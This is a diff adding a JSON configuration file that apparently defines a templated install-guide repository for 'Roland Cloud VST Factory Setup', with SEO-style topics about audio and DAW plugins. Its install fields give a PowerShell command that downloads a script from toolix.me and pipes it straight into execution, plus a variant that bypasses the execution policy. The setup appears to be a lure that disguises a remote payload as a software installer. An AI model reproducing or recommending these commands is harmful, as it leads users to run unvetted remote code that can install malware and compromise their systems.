@@ -1,0 +1,27 @@
+{
+  "repo": "Roland-Cloud-VST-Factory-Setup",
+  "product": "Roland Cloud VST Factory Setup",
+  "product_title": "Roland Cloud VST Factory",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "how-to-install-roland-cloud-vst-factory",
+    "roland-cloud-vst-factory-app",
+    "mixing-tools",
+    "audio-editing",
+    "music-production",
+    "daw-plugin",
+    "roland-cloud-vst-factory-creative-tool",
+    "roland-cloud-vst-factory-design-tool",
+    "roland-cloud-vst-factory",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
